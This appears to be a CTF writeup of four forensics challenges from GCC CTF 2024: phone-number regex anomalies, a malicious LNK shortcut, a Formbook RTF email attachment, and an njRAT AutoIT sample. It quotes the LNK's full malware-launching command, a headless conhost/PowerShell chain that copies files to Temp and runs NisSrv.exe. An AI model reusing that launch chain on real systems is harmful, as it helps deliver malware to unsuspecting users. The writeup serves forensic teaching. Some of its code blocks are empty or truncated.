This is a writeup for all forensics challenges from GCC CTF 2024. During this CTF, I collaborated with @Odin to tackle the forensics challenge. However, I was also participating in another CTF at the time, so full credit goes to @Odin for handling the majority of the work.

@Odin also left a wholesome message:
> I'm very happy when I solved all forensic challenges. We tried hard so much and this is the perfect result for us!. Thank you very much for reading our solution!

**Question:** Introduction to anomaly detection. Find the phone numbers that are not formed in the correct way and decode the hidden message.

**Flag:** `GCC{R3g3x_4r3_W1ld!!!!}`

We are given a CSV file to investigate. Analyzing it, several phonebook entries can be identified, each of them from a different country.

```
└─$ cat phonebook.csv | head
ID,FIRST_NAME,LAST_NAME,MAIL,PHONE_NUMBER,ADDRESS

```

Our unintended method in solving this challenge was pretty funny. First, we extracted the phone numbers only from the CSV file.

```python
import csv
with open('./phonebook.csv', mode='r', encoding="utf8") as file:
    csvFile = csv.reader(file)
    for lines in csvFile:
        with open("output.txt", "a") as file_written:
            file_written.write(lines[4])
            file_written.write("\n")
```

Then, we can locate anomalies from the phone numbers. According to this [StackOverflow post](https://stackoverflow.com/questions/13719367/what-is-the-best-regular-expression-for-phone-numbers), it seems that phone numbers had their own regex format. Another Python script can be created to filter out regex patterns that do not correlate to phone numbers.

```python
import re

def validNumber(phone_number):
    pattern = re.compile("^[\dA-Z]{3}-[\dA-Z]{3}-[\dA-Z]{4}$", re.IGNORECASE)
    return pattern.match(phone_number) is not None
with open("output.txt", "r") as file:
    for i in file.read().split("\n"):
        if validNumber(i) == False:
            with open("not_correct.txt", "a") as file_written:
                file_written.write(i)
                file_written.write("\n")
```

After that we perform our guessing game. Since we know the parts of the flag will always start with `GCC{` and ends with `}`, we can use their hex values to find the phone number that has them. Similarly, we also included the hex value of `_` since it's common to have it in flags.

```
┌──(kali㉿kali)-[/mnt/hgfs/sharedfolder/gcc]
└─$ cat not_correct.txt | grep "4743437b"   
4743437b5233
                                                                                
┌──(kali㉿kali)-[/mnt/hgfs/sharedfolder/gcc]
└─$ cat not_correct.txt | grep "5f"      
6733785f347233
5f57316c64

┌──(kali㉿kali)-[/mnt/hgfs/sharedfolder/gcc]

## Pretty Links [Forensics]
**Question:** Following the compromise of a partner, your colleague has to capture the file system of a victim machine. In addition to that, a strange file attracted attention during its investigation.

* Find the binary used to initiate the indirect command execution
* Find the IP and port of the attacker

Format: GCC{cmd.exe:127.0.0.1:8080}

**Flag:** `GCC{conhost.exe:172.29.107.95:7894}`

We are given an AD1 image and ISO file to investigate. Analyzing the ISO file, a suspicious LNK file can be identified which had a Powershell script executing the malware.

![link1](/assets/posts/gccctf2024/link1.png)

```powershell
"C:\Windows\System32\conhost.exe" --headless "%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe" "$zweeki=$env:Temp;$ocounselk=[System.IO.Path]::GetFullPath($zweeki);$poledemy = $pwd;Copy-Item "$poledemy\*" -Destination $ocounselk -Recurse -Force | Out-Null;cd $ocounselk;;.\Facture.pdf; .\NisSrv.exe"
```

Analyzing the AD1 image to locate the malware, they can be identified in the Temp folder.

![link2](/assets/posts/gccctf2024/link2.png)

Extracting and running the malware on our virtual machine, the error message mentioned that it required `mpclient.dll` to run. Since the DLL was already in the Temp folder, we can extract it and upload it to VirusTotal. Surprisingly, it was also malicious.

![link3](/assets/posts/gccctf2024/link3.png)

![link4](/assets/posts/gccctf2024/link4.png)

Looking at the DLL behavior information, the IP and port can be obtained.

## Fill the library [Forensics]
**Question:** An employee has been compromised following a malicious email campaign. In order to allow him to resume his activities, we have entrusted you with analyzing the email.

* Find the 3 CVEs that the attacker is trying to exploit
* Find the name of the object containing the malicious payload
* Find the family name of this malware

Format: GCC{CVE-ID_CVE-ID_CVE-ID:object_name:malware_family}

**Flag:** `GCC{CVE-2017-11882_CVE-2018-0798_CVE-2018-0802:EQuAtIon.3:Formbook}`

We are given an EML file too investigate. Analyzing the email with Thunderbird, an attachment named `Bank detail.doc` can be obtained from it.

![lib1](/assets/posts/gccctf2024/lib1.png)

However, the attachment was actually a RTF file that seems malicious too. 

![lib2](/assets/posts/gccctf2024/lib2.png)

Uploading the RTF file to VirusTotal, the CVEs can be obtained.

![lib3](/assets/posts/gccctf2024/lib3.png)

Next, @Odin mentioned using [rtfdump](https://github.com/DidierStevens/DidierStevensSuite/blob/master/rtfdump.py) to extract data from the RTF file. Doing so, we managed to obtain the name of the malicious payload.

![lib4](/assets/posts/gccctf2024/lib4.png)

Now we have to find the malware family using threat intelligence platforms like [abuse.ch](https://abuse.ch/). Using [URLhaus](https://urlhaus.abuse.ch/) and the IP address of the C2 server, several results about Formbook can be found.

![lib5](/assets/posts/gccctf2024/lib5.png)

Additionally, many articles discussed about Formbook with the CVEs identified previously.

![lib6](/assets/posts/gccctf2024/lib6.png)

> Edit: @crazyman just did an in-depth [research](https://hackmd.io/@A3jD_2-KSHGKXuvq1LDRuA/BysMWt4pT) on why the flag is actually wrong.

## Threat analysis [Forensics]
**Question:** While the operator was working on his machine, he noticed strange behaviour on his workstation. With the help of his CERT, he made a copy of the hard disk for analysis. Using your knowledge of forensics and threat analysis, find out some of the characteristics of this malware.

Format: GCC{portC2:MITREATT&CK_Persistence_Technique:malware_family}

**Flag:** `GCC{1245:T1547:njrat}`

We are given a raw disk image to investigate. Analyzing common Windows locations, a malware `aL4N.exe` can be identified within `C:\Users\operator\AppData\Roaming\`.

![threat1](/assets/posts/gccctf2024/threat1.png)

Analyzing the malware on VirusTotal, the persistence technique can be identified.

![threat2](/assets/posts/gccctf2024/threat2.png)

Analyzing the file's metadata, we find that the malware was compiled using `AutoIT v3`. VirusTotal also shows the malware being packed by AutoIT.

![threat3](/assets/posts/gccctf2024/threat3.png)

![threat4](/assets/posts/gccctf2024/threat4.png)

We can utilize `Exe2Aut.exe` to automatically to decompile the malware to view the source code.

```

Within the source code, the C2 IP and port can be identified. Additionally, the variable `$y` had a suspicious value.

![threat5](/assets/posts/gccctf2024/threat5.png)

Searching the value online, another source code can be found on [GitHub](https://github.com/mwsrc/njRAT/blob/master/njWorm/src.txt.au3) which shows the malware family.
